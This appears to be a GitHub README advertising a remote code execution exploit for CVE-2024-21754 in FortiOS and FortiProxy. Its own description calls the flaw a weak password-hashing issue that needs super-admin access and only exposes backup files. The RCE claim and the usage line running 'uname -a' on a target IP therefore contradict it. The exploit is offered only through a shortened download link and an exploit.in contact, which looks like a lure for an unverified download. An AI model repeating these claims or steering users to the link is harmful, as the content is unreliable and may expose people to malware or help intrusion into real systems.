# FortiOS and FortiProxy Password Hashing Vulnerability to RCE (CVE-2024-21754)

## Overview

A critical vulnerability, classified as CVE-2024-21754, has been identified in FortiOS and FortiProxy versions up to 7.4.3, 7.2, 7.0, 6.4, and 2.0. This vulnerability, categorized under CWE-916, involves the use of password hashes with insufficient computational effort, potentially allowing a privileged attacker with super-admin profile and CLI access to decrypt backup files.

## Details

- **CVE ID**: [CVE-2024-21754](https://nvd.nist.gov/vuln/detail/CVE-2024-21754)
- **Discovered**: 2024-04-27
- **Published**: 2024-06-27
- **Impact**: Confidentiality
- **Exploit Availability**: Not public, only private.

## Vulnerability Description

The vulnerability lies in the password hashing mechanism employed by FortiOS and FortiProxy. The hashing algorithm used in vulnerable versions provides insufficient computational effort, making it susceptible to brute force attacks. An attacker with super-admin privileges and CLI access can exploit this weakness to potentially decrypt backup files containing sensitive information.

## Affected Versions

**FortiOS:**

- 7.4.3 and below
- 7.2 all versions
- 7.0 all versions
- 6.4 all versions

**FortiProxy:**

- 7.4.2 and below
- 7.2 all versions
- 7.0 all versions
- 2.0 all versions


## Running

To run exploit you need Python 3.9.
Execute:
```bash
python exploit.py -h 10.10.10.10 -c 'uname -a'
```

## Contact

For inquiries, please contact **cybersecuritist@exploit.in**

## Exploit:
### [Download here](https://t.ly/U6cSD)


![image](https://github.com/CyberSecuritist/CVE-2024-21754-Forti-RCE/assets/174053555/a5d4245a-f363-4eb2-a829-0316ab4e0d9d)
![image](https://github.com/CyberSecuritist/CVE-2024-21754-Forti-RCE/assets/174053555/88f234d8-9dc4-42cc-8b35-02a333ed2a7c)


